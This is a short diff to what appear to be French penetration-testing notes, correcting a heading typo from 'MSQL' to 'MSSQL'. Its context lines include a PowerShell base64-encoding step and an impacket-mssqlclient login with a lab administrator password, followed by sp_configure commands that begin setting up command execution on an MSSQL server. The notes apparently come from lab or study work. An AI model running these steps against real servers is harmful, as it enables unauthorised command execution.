@@ -38,7 +38,7 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText  
 exit  
 
-## Executer des commandes via MSQL :  
+## Executer des commandes via MSSQL :  
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth  
 EXECUTE sp_configure 'show advanced options', 1;  
 RECONFIGURE;  
